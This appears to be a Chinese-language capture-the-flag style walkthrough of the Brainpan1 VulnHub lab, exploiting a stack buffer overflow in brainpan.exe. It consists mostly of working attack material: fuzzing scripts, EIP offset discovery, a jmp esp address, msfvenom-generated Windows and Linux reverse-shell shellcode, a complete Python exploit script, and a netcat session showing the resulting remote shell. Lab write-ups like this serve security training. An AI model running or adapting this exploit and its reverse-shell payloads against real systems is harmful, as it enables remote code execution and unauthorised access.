<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;brainpan.exe</span><br><span class="line">[+] initializing winsock...done.</span><br><span class="line">[+] server socket created.</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port 9999</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[get_reply] s_]</span><br><span class="line">[get_reply] copied 1003 bytes to buffer</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub193.jpg"></p>
<p>AM！造成了我们想要的段错误，所见，已经成功地使用模糊A覆盖了eip。是时候控制自己，享受一些乐趣了。<br>下一步，需要多少字节来填充缓冲区以使eip？使用Metasploit的工具进行此活动。创建一个模式作为开始。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</span><br></pre></td></tr></table></figure>

<p>将其添加到模糊测试脚本etfuzz.py中，用模式输出替换掉A的垃圾数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.43.98&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk </span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>下一步。重新启动brainpan.exe进程，重新附加到进程，然后将模糊测试脚本发送给侦听器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;brainpan.exe</span><br><span class="line">[+] initializing winsock...done.</span><br><span class="line">[+] server socket created.</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port 9999</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[get_reply] s = [Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B(_]</span><br><span class="line">[get_reply] copied 1003 bytes to buffer</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub194.jpg"></p>
<p>再次成功地覆盖了eip。记下指令指针地址35724134，将其推入Metasploit的模式偏移工具中，这将提供为控制eip而需要发送到缓冲区的字节数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134</span></span><br><span class="line">[*] Exact match at offset 524</span><br></pre></td></tr></table></figure>

<p>知道只需要524字节的“垃圾数据”就可以成为eip。相应地编辑模糊测试器，看看是否可以用某些B（\x42）成功覆盖eip。重新运行，重新连接并启动模糊测试器。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub195.jpg"></p>
<p>瞧！如所见，已成功用4个字节的B覆盖了eip。下一个是什么？接下来，看看是否可以将自己的代码放入esp中。如果可以将代码放入esp，将查找名为jmp esp的函数调用，告诉eip指向esp，从而能够执行存储在esp中的恶意代码。编辑模糊器，使其在esp中包含一堆C（\x43），并查看是否有足够的空间容纳潜在的Shellcode。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.43.98&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\x42&quot;</span> * 4</span><br><span class="line">shellcode = <span class="string">&quot;\x43&quot;</span> * 500</span><br><span class="line"> </span><br><span class="line">payload = junk + eip + shellcode</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub196.jpg"></p>
<p>正如上面看到的，已经成功地用大量C填充了esp，这使知道有一些可用于放置shellcode的区域。让看看是否可以找到jmp esp函数的地址。在Immunity Debugger中，使用ctrl-f并输入搜索jmp esp。如所见，第一个jmp esp地址是311712F3。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub197.jpg"></p>
<p>下一步，生成一些shellcode，以测试概念验证（PoC）是否有效。由于要测试的PoC框是一个windoZe机器，因此将使用msfvenom生成一个简单的Windows reverse shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 R -e x86/shikata_ga_nai -b &#x27;\x00&#x27; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 351 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 351</span><br><span class="line">Payload size: 351 bytes</span><br><span class="line">Final size of python file: 1712 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xba\x3a\x75\x8a\xdd\xd9\xed\xd9\x74\x24\xf4\x5b\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\xd1\x89\x68&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x28\xd9\x9a\xef\xd3\x21\x5b\x90\x5a\xc4\x6a\x90\x39&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x8d\xdd\x20\x49\xc3\xd1\xcb\x1f\xf7\x62\xb9\xb7\xf8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc3\x74\xee\x37\xd3\x25\xd2\x56\x57\x34\x07\xb8\x66&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf7\x5a\xb9\xaf\xea\x97\xeb\x78\x60\x05\x1b\x0c\x3c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x96\x90\x5e\xd0\x9e\x45\x16\xd3\x8f\xd8\x2c\x8a\x0f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xe1\xa6\x19\xc3\xe6\x83\xd0\x78\xdc\x78\xe3\xa8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x2c\x80\x48\x95\x80\x73\x90\xd2\x27\x6c\xe7\x2a\x54&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x11\xf0\xe9\x26\xcd\x75\xe9\x81\x86\x2e\xd5\x30\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xa8\x9e\x3f\x27\xbe\xf8\x23\xb6\x13\x73\x5f\x33\x92&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x53\xe9\x07\xb1\x77\xb1\xdc\xd8\x2e\x1f\xb2\xe5\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc0\x6b\x40\x3b\xed\x78\xf9\x66\x7a\x4c\x30\x98\x7a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xda\x43\xeb\x48\x45\xf8\x63\xe1\x0e\x26\x74\x06\x25&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9e\xea\xf9\xc6\xdf\x23\x3e\x92\x8f\x5b\x97\x9b\x5b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9b\x18\x4e\xcb\xcb\xb6\x21\xac\xbb\x76\x92\x44\xd1&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x78\xcd\x75\xda\x52\x66\x1f\x21\x35\x49\x48\x11\xa3&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x21\x8b\x61\x2a\x09\x02\x87\x46\x7d\x43\x10\xff\xe4&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xce\xea\x9e\xe9\xc4\x97\xa1\x62\xeb\x68\x6f\x83\x86&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x7a\x18\x63\xdd\x20\x8f\x7c\xcb\x4c\x53\xee\x90\x8c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x1a\x13\x0f\xdb\x4b\xe5\x46\x89\x61\x5c\xf1\xaf\x7b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x3a\x6b\xa0\xf9\xc5\x72\x25\x45\xe2\x64\xf3\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xae\xd0\xab\x10\x78\x8e\x0d\xcb\xca\x78\xc4\xa0\x84&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xec\x91\x8a\x16\x6a\x9e\xc6\xe0\x92\x2f\xbf\xb4\xad&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x80\x57\x31\xd6\xfc\xc7\xbe\x0d\x45\xf7\xf4\x0f\xec&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x90\x50\xda\xac\xfc\x62\x31\xf2\xf8\xe0\xb3\x8b\xfe&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf9\xb6\x8e\xbb\xbd\x2b\xe3\xd4\x2b\x4b\x50\xd4\x79&quot;</span></span><br></pre></td></tr></table></figure>

<p>接下来，让把它们放在一起,payload将如下所示：{junk} {jmp esp地址} {nops + buf}</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.43.98&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\xf3\x12\x17\x31&quot;</span></span><br><span class="line">buf =  b<span class="string">&quot;\x90&quot;</span> * 13</span><br><span class="line">buf += b<span class="string">&quot;\xba\x3a\x75\x8a\xdd\xd9\xed\xd9\x74\x24\xf4\x5b\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\xd1\x89\x68&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x28\xd9\x9a\xef\xd3\x21\x5b\x90\x5a\xc4\x6a\x90\x39&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x8d\xdd\x20\x49\xc3\xd1\xcb\x1f\xf7\x62\xb9\xb7\xf8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc3\x74\xee\x37\xd3\x25\xd2\x56\x57\x34\x07\xb8\x66&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf7\x5a\xb9\xaf\xea\x97\xeb\x78\x60\x05\x1b\x0c\x3c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x96\x90\x5e\xd0\x9e\x45\x16\xd3\x8f\xd8\x2c\x8a\x0f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xe1\xa6\x19\xc3\xe6\x83\xd0\x78\xdc\x78\xe3\xa8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x2c\x80\x48\x95\x80\x73\x90\xd2\x27\x6c\xe7\x2a\x54&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x11\xf0\xe9\x26\xcd\x75\xe9\x81\x86\x2e\xd5\x30\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xa8\x9e\x3f\x27\xbe\xf8\x23\xb6\x13\x73\x5f\x33\x92&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x53\xe9\x07\xb1\x77\xb1\xdc\xd8\x2e\x1f\xb2\xe5\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc0\x6b\x40\x3b\xed\x78\xf9\x66\x7a\x4c\x30\x98\x7a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xda\x43\xeb\x48\x45\xf8\x63\xe1\x0e\x26\x74\x06\x25&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9e\xea\xf9\xc6\xdf\x23\x3e\x92\x8f\x5b\x97\x9b\x5b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9b\x18\x4e\xcb\xcb\xb6\x21\xac\xbb\x76\x92\x44\xd1&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x78\xcd\x75\xda\x52\x66\x1f\x21\x35\x49\x48\x11\xa3&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x21\x8b\x61\x2a\x09\x02\x87\x46\x7d\x43\x10\xff\xe4&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xce\xea\x9e\xe9\xc4\x97\xa1\x62\xeb\x68\x6f\x83\x86&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x7a\x18\x63\xdd\x20\x8f\x7c\xcb\x4c\x53\xee\x90\x8c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x1a\x13\x0f\xdb\x4b\xe5\x46\x89\x61\x5c\xf1\xaf\x7b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x3a\x6b\xa0\xf9\xc5\x72\x25\x45\xe2\x64\xf3\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xae\xd0\xab\x10\x78\x8e\x0d\xcb\xca\x78\xc4\xa0\x84&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xec\x91\x8a\x16\x6a\x9e\xc6\xe0\x92\x2f\xbf\xb4\xad&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x80\x57\x31\xd6\xfc\xc7\xbe\x0d\x45\xf7\xf4\x0f\xec&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x90\x50\xda\xac\xfc\x62\x31\xf2\xf8\xe0\xb3\x8b\xfe&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf9\xb6\x8e\xbb\xbd\x2b\xe3\xd4\x2b\x4b\x50\xd4\x79&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk + eip + buf</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>启动brainpan.exe程序，在端口443上创建netcat侦听器，然后测试一下PoC代码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.56.1: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.1] 18602</span><br><span class="line">Microsoft Windows [�汾 10.0.18363.592]</span><br><span class="line">(c) 2019 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;chcp 65001</span><br><span class="line">chcp 65001</span><br><span class="line">Active code page: 65001</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;whoami  </span><br><span class="line">whoami</span><br><span class="line">iz94tylsq69z\hasee</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 7A49-F084</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\HASEE\Desktop\brainpan1</span><br><span class="line"></span><br><span class="line">2020/02/01  01:21    &lt;DIR&gt;          .</span><br><span class="line">2020/02/01  01:21    &lt;DIR&gt;          ..</span><br><span class="line">2020/01/31  20:48            21,190 brainpan.exe</span><br><span class="line">2020/02/01  01:21             2,166 etfuzz.py</span><br><span class="line">               2 File(s)         23,356 bytes</span><br><span class="line">               2 Dir(s)  151,135,014,912 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\IZ94TYLSQ69Z</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            ASPNET                   DefaultAccount           </span><br><span class="line">Guest                    HASEE                    WDAGUtilityAccount </span><br></pre></td></tr></table></figure>

<ul>
<li>注意：这个shell是测试电脑的shell，如果乱码，输入chcp 65001就不会乱码了</li>
</ul>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>好东西…。现在有一个reverse TCP连接到我们的Windows计算机。是时候创建一个Linux reverse shell了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 R -e x86/alpha_upper -b &#x27;\x00&#x27; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/alpha_upper</span><br><span class="line">x86/alpha_upper succeeded with size 205 (iteration=0)</span><br><span class="line">x86/alpha_upper chosen with final size 205</span><br><span class="line">Payload size: 205 bytes</span><br><span class="line">Final size of python file: 1007 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x89\xe5\xd9\xcb\xd9\x75\xf4\x58\x50\x59\x49\x49\x49&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4a\x49\x30\x31\x49\x4b\x5a\x57\x4b\x53\x31\x43\x47&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x33\x46\x33\x53\x5a\x53\x32\x4b\x39\x4b\x51\x38\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x52\x46\x58\x4d\x4d\x50\x4a\x33\x36\x39\x48\x30\x37&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4f\x58\x4d\x4d\x50\x30\x49\x44\x39\x5a\x59\x35\x38&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x50\x59\x38\x30\x38\x45\x36\x32\x48\x44\x42\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x35\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x42\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x56\x30\x36\x31\x30\x53\x4f\x43\x33\x33\x4c\x49\x4b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x51\x38\x4d\x4d\x50\x50\x52\x43\x58\x52\x4e\x46\x4f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x44\x33\x52\x48\x53\x58\x36\x4f\x46\x4f\x32\x42\x53&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x59\x4d\x59\x4a\x43\x31\x42\x31\x43\x4c\x49\x4d\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41&quot;</span></span><br></pre></td></tr></table></figure>

